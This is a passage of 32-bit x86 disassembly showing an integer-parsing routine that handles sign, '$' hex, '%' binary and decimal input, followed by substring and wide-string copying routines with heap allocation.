  4059a7:	53                   	push   %ebx
  4059a8:	55                   	push   %ebp
  4059a9:	83 f8 2d             	cmp    $0x2d,%eax
  4059ac:	75 05                	jne    0x4059b3
  4059ae:	8d 68 d4             	lea    -0x2c(%eax),%ebp
  4059b1:	eb 07                	jmp    0x4059ba
  4059b3:	33 ed                	xor    %ebp,%ebp
  4059b5:	83 f8 2b             	cmp    $0x2b,%eax
  4059b8:	75 03                	jne    0x4059bd
  4059ba:	83 c7 02             	add    $0x2,%edi
  4059bd:	0f b7 1f             	movzwl (%edi),%ebx
  4059c0:	83 fb 24             	cmp    $0x24,%ebx
  4059c3:	75 70                	jne    0x405a35
  4059c5:	0f b7 47 02          	movzwl 0x2(%edi),%eax
  4059c9:	83 c7 02             	add    $0x2,%edi
  4059cc:	83 f8 30             	cmp    $0x30,%eax
  4059cf:	72 05                	jb     0x4059d6
  4059d1:	83 f8 39             	cmp    $0x39,%eax
  4059d4:	76 1c                	jbe    0x4059f2
  4059d6:	83 f8 41             	cmp    $0x41,%eax
  4059d9:	72 05                	jb     0x4059e0
  4059db:	83 f8 46             	cmp    $0x46,%eax
  4059de:	76 12                	jbe    0x4059f2
  4059e0:	83 f8 61             	cmp    $0x61,%eax
  4059e3:	0f 82 bf 00 00 00    	jb     0x405aa8
  4059e9:	83 f8 66             	cmp    $0x66,%eax
  4059ec:	0f 87 b6 00 00 00    	ja     0x405aa8
  4059f2:	83 f8 30             	cmp    $0x30,%eax
  4059f5:	72 19                	jb     0x405a10
  4059f7:	83 f8 39             	cmp    $0x39,%eax
  4059fa:	77 14                	ja     0x405a10
  4059fc:	83 e9 03             	sub    $0x3,%ecx
  4059ff:	99                   	cltd
  405a00:	83 de 00             	sbb    $0x0,%esi
  405a03:	0f a4 ce 04          	shld   $0x4,%ecx,%esi
  405a07:	c1 e1 04             	shl    $0x4,%ecx
  405a0a:	03 c8                	add    %eax,%ecx
  405a0c:	13 f2                	adc    %edx,%esi
  405a0e:	eb b5                	jmp    0x4059c5
  405a10:	0f a4 ce 04          	shld   $0x4,%ecx,%esi
  405a14:	c1 e1 04             	shl    $0x4,%ecx
  405a17:	83 f8 61             	cmp    $0x61,%eax
  405a1a:	99                   	cltd
  405a1b:	72 0c                	jb     0x405a29
  405a1d:	03 c8                	add    %eax,%ecx
  405a1f:	13 f2                	adc    %edx,%esi
  405a21:	83 e9 57             	sub    $0x57,%ecx
  405a24:	83 de 00             	sbb    $0x0,%esi
  405a27:	eb 9c                	jmp    0x4059c5
  405a29:	03 c8                	add    %eax,%ecx
  405a2b:	13 f2                	adc    %edx,%esi
  405a2d:	83 e9 37             	sub    $0x37,%ecx
  405a30:	83 de 00             	sbb    $0x0,%esi
  405a33:	eb 90                	jmp    0x4059c5
  405a35:	83 fb 25             	cmp    $0x25,%ebx
  405a38:	75 34                	jne    0x405a6e
  405a3a:	0f b7 47 02          	movzwl 0x2(%edi),%eax
  405a3e:	83 c7 02             	add    $0x2,%edi
  405a41:	83 f8 30             	cmp    $0x30,%eax
  405a44:	72 62                	jb     0x405aa8
  405a46:	66 83 f8 31          	cmp    $0x31,%ax
  405a4a:	77 5c                	ja     0x405aa8
  405a4c:	83 e9 18             	sub    $0x18,%ecx
  405a4f:	0f b7 c0             	movzwl %ax,%eax
  405a52:	99                   	cltd
  405a53:	83 de 00             	sbb    $0x0,%esi
  405a56:	0f a4 ce 01          	shld   $0x1,%ecx,%esi
  405a5a:	03 c9                	add    %ecx,%ecx
  405a5c:	03 c8                	add    %eax,%ecx
  405a5e:	0f b7 47 02          	movzwl 0x2(%edi),%eax
  405a62:	13 f2                	adc    %edx,%esi
  405a64:	83 c7 02             	add    $0x2,%edi
  405a67:	83 f8 30             	cmp    $0x30,%eax
  405a6a:	73 da                	jae    0x405a46
  405a6c:	eb 3a                	jmp    0x405aa8
  405a6e:	83 fb 30             	cmp    $0x30,%ebx
  405a71:	72 35                	jb     0x405aa8
  405a73:	66 83 fb 39          	cmp    $0x39,%bx
  405a77:	77 2f                	ja     0x405aa8
  405a79:	8b c1                	mov    %ecx,%eax
  405a7b:	8b d6                	mov    %esi,%edx
  405a7d:	0f a4 c2 02          	shld   $0x2,%eax,%edx
  405a81:	c1 e0 02             	shl    $0x2,%eax
  405a84:	03 c8                	add    %eax,%ecx
  405a86:	0f b7 c3             	movzwl %bx,%eax
  405a89:	0f b7 5f 02          	movzwl 0x2(%edi),%ebx
  405a8d:	13 f2                	adc    %edx,%esi
  405a8f:	99                   	cltd
  405a90:	0f a4 ce 01          	shld   $0x1,%ecx,%esi
  405a94:	03 c9                	add    %ecx,%ecx
  405a96:	03 c8                	add    %eax,%ecx
  405a98:	13 f2                	adc    %edx,%esi
  405a9a:	83 e9 30             	sub    $0x30,%ecx
  405a9d:	83 de 00             	sbb    $0x0,%esi
  405aa0:	83 c7 02             	add    $0x2,%edi
  405aa3:	83 fb 30             	cmp    $0x30,%ebx
  405aa6:	73 cb                	jae    0x405a73
  405aa8:	85 ed                	test   %ebp,%ebp
  405aaa:	5d                   	pop    %ebp
  405aab:	5b                   	pop    %ebx
  405aac:	74 07                	je     0x405ab5
  405aae:	f7 d9                	neg    %ecx
  405ab0:	83 d6 00             	adc    $0x0,%esi
  405ab3:	f7 de                	neg    %esi
  405ab5:	5f                   	pop    %edi
  405ab6:	8b d6                	mov    %esi,%edx
  405ab8:	8b c1                	mov    %ecx,%eax
  405aba:	5e                   	pop    %esi
  405abb:	c2 04 00             	ret    $0x4
  405abe:	cc                   	int3
  405abf:	cc                   	int3
  405ac0:	53                   	push   %ebx
  405ac1:	55                   	push   %ebp
  405ac2:	56                   	push   %esi
  405ac3:	8b 74 24 10          	mov    0x10(%esp),%esi
  405ac7:	57                   	push   %edi
  405ac8:	56                   	push   %esi
  405ac9:	e8 92 02 00 00       	call   0x405d60
  405ace:	33 c9                	xor    %ecx,%ecx
  405ad0:	8b f8                	mov    %eax,%edi
  405ad2:	8b 44 24 18          	mov    0x18(%esp),%eax
  405ad6:	8b df                	mov    %edi,%ebx
  405ad8:	85 c0                	test   %eax,%eax
  405ada:	0f 98 c1             	sets   %cl
  405add:	49                   	dec    %ecx
  405ade:	23 c8                	and    %eax,%ecx
  405ae0:	3b f9                	cmp    %ecx,%edi
  405ae2:	7e 02                	jle    0x405ae6
  405ae4:	8b d9                	mov    %ecx,%ebx
  405ae6:	56                   	push   %esi
  405ae7:	e8 34 83 00 00       	call   0x40de20
  405aec:	ff 74 24 1c          	push   0x1c(%esp)
  405af0:	89 44 24 18          	mov    %eax,0x18(%esp)
  405af4:	53                   	push   %ebx
  405af5:	e8 a6 83 00 00       	call   0x40dea0
  405afa:	8b e8                	mov    %eax,%ebp
  405afc:	8b 44 24 14          	mov    0x14(%esp),%eax
  405b00:	85 c0                	test   %eax,%eax
  405b02:	74 08                	je     0x405b0c
  405b04:	50                   	push   %eax
  405b05:	e8 66 84 00 00       	call   0x40df70
  405b0a:	8b f0                	mov    %eax,%esi
  405b0c:	85 f6                	test   %esi,%esi
  405b0e:	74 14                	je     0x405b24
  405b10:	2b fb                	sub    %ebx,%edi
  405b12:	53                   	push   %ebx
  405b13:	8d 04 7e             	lea    (%esi,%edi,2),%eax
  405b16:	50                   	push   %eax
  405b17:	55                   	push   %ebp
  405b18:	e8 83 84 00 00       	call   0x40dfa0
  405b1d:	5f                   	pop    %edi
  405b1e:	5e                   	pop    %esi
  405b1f:	5d                   	pop    %ebp
  405b20:	5b                   	pop    %ebx
  405b21:	c2 0c 00             	ret    $0xc
  405b24:	5f                   	pop    %edi
  405b25:	33 c0                	xor    %eax,%eax
  405b27:	5e                   	pop    %esi
  405b28:	66 89 45 00          	mov    %ax,0x0(%ebp)
  405b2c:	5d                   	pop    %ebp
  405b2d:	5b                   	pop    %ebx
  405b2e:	c2 0c 00             	ret    $0xc
  405b31:	cc                   	int3
  405b32:	cc                   	int3
  405b33:	cc                   	int3
  405b34:	cc                   	int3
  405b35:	cc                   	int3
  405b36:	cc                   	int3
  405b37:	cc                   	int3
  405b38:	cc                   	int3
  405b39:	cc                   	int3
  405b3a:	cc                   	int3
  405b3b:	cc                   	int3
  405b3c:	cc                   	int3
  405b3d:	cc                   	int3
  405b3e:	cc                   	int3
  405b3f:	cc                   	int3
  405b40:	83 ec 0c             	sub    $0xc,%esp
  405b43:	53                   	push   %ebx
  405b44:	55                   	push   %ebp
  405b45:	56                   	push   %esi
  405b46:	57                   	push   %edi
  405b47:	8b 7c 24 20          	mov    0x20(%esp),%edi
  405b4b:	85 ff                	test   %edi,%edi
  405b4d:	74 16                	je     0x405b65
  405b4f:	8b df                	mov    %edi,%ebx
  405b51:	8d 4b 02             	lea    0x2(%ebx),%ecx
  405b54:	66 8b 03             	mov    (%ebx),%ax
  405b57:	83 c3 02             	add    $0x2,%ebx
  405b5a:	66 85 c0             	test   %ax,%ax
  405b5d:	75 f5                	jne    0x405b54
  405b5f:	2b d9                	sub    %ecx,%ebx
  405b61:	d1 fb                	sar    $1,%ebx
  405b63:	eb 02                	jmp    0x405b67
  405b65:	33 db                	xor    %ebx,%ebx
  405b67:	57                   	push   %edi
  405b68:	e8 b3 82 00 00       	call   0x40de20
  405b6d:	8b 74 24 24          	mov    0x24(%esp),%esi
  405b71:	56                   	push   %esi
  405b72:	89 44 24 24          	mov    %eax,0x24(%esp)
  405b76:	e8 a5 82 00 00       	call   0x40de20
  405b7b:	ff 74 24 34          	push   0x34(%esp)
  405b7f:	89 44 24 28          	mov    %eax,0x28(%esp)
  405b83:	53                   	push   %ebx
  405b84:	e8 17 83 00 00       	call   0x40dea0
  405b89:	8b e8                	mov    %eax,%ebp
  405b8b:	8b 44 24 20          	mov    0x20(%esp),%eax
  405b8f:	85 c0                	test   %eax,%eax
  405b91:	74 08                	je     0x405b9b
  405b93:	50                   	push   %eax
  405b94:	e8 d7 83 00 00       	call   0x40df70
  405b99:	8b f8                	mov    %eax,%edi
  405b9b:	8b 44 24 24          	mov    0x24(%esp),%eax
  405b9f:	85 c0                	test   %eax,%eax
  405ba1:	74 08                	je     0x405bab
  405ba3:	50                   	push   %eax
  405ba4:	e8 c7 83 00 00       	call   0x40df70
  405ba9:	8b f0                	mov    %eax,%esi
  405bab:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  405baf:	85 ff                	test   %edi,%edi
  405bb1:	0f 84 5d 01 00 00    	je     0x405d14
  405bb7:	66 83 3f 00          	cmpw   $0x0,(%edi)
  405bbb:	0f 84 53 01 00 00    	je     0x405d14
  405bc1:	85 f6                	test   %esi,%esi
  405bc3:	0f 84 30 01 00 00    	je     0x405cf9
  405bc9:	66 83 3e 00          	cmpw   $0x0,(%esi)
  405bcd:	0f 84 26 01 00 00    	je     0x405cf9
  405bd3:	8b ce                	mov    %esi,%ecx
  405bd5:	89 7c 24 14          	mov    %edi,0x14(%esp)
  405bd9:	8d 51 02             	lea    0x2(%ecx),%edx
  405bdc:	8d 64 24 00          	lea    0x0(%esp),%esp
  405be0:	66 8b 01             	mov    (%ecx),%ax
  405be3:	83 c1 02             	add    $0x2,%ecx
  405be6:	66 85 c0             	test   %ax,%ax
  405be9:	75 f5                	jne    0x405be0
  405beb:	2b ca                	sub    %edx,%ecx
  405bed:	d1 f9                	sar    $1,%ecx
  405bef:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  405bf4:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  405bf8:	74 3a                	je     0x405c34
  405bfa:	8d 04 4d 02 00 00 00 	lea    0x2(,%ecx,2),%eax
  405c01:	50                   	push   %eax
  405c02:	6a 00                	push   $0x0
  405c04:	ff 35 ec 6f 41 00    	push   0x416fec
  405c0a:	ff 15 20 65 41 00    	call   *0x416520
  405c10:	8b d0                	mov    %eax,%edx
  405c12:	89 44 24 10          	mov    %eax,0x10(%esp)
  405c16:	2b d6                	sub    %esi,%edx
  405c18:	eb 06                	jmp    0x405c20
  405c1a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  405c20:	0f b7 0e             	movzwl (%esi),%ecx
  405c23:	8d 76 02             	lea    0x2(%esi),%esi
  405c26:	66 89 4c 32 fe       	mov    %cx,-0x2(%edx,%esi,1)
  405c2b:	66 85 c9             	test   %cx,%cx
  405c2e:	75 f0                	jne    0x405c20
  405c30:	8b f0                	mov    %eax,%esi
  405c32:	eb 08                	jmp    0x405c3c
  405c34:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405c38:	89 44 24 10          	mov    %eax,0x10(%esp)
  405c3c:	f6 44 24 28 01       	testb  $0x1,0x28(%esp)
  405c41:	c7 44 24 34 0d 53 40 	movl   $0x40530d,0x34(%esp)
  405c48:	00 
  405c49:	75 08                	jne    0x405c53
  405c4b:	c7 44 24 34 f5 52 40 	movl   $0x4052f5,0x34(%esp)
  405c52:	00 
  405c53:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405c57:	83 f8 01             	cmp    $0x1,%eax
  405c5a:	7e 1d                	jle    0x405c79
  405c5c:	48                   	dec    %eax
  405c5d:	50                   	push   %eax
  405c5e:	57                   	push   %edi
  405c5f:	55                   	push   %ebp
  405c60:	e8 9c f6 ff ff       	call   0x405301
  405c65:	8b 44 24 38          	mov    0x38(%esp),%eax
  405c69:	83 c4 0c             	add    $0xc,%esp
